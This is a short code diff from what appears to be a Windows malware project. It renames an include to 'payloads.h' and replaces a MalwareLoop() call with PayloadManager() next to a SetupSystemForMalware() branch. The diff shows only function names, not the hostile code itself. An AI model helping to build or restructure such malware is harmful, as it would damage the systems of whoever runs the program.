@@ -1,7 +1,7 @@
 #include "gdi.h"
 #include "tools.h"
 #include "setup.h"
-#include "loop.h"
+#include "payloads.h"
 #include <VersionHelpers.h>
 
 
@@ -23,7 +23,7 @@ INT wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int
         SetupSystemForMalware();
     }
     else {  
-        MalwareLoop();
+        PayloadManager();
         FreeGDIElements();
         return 0;
     }
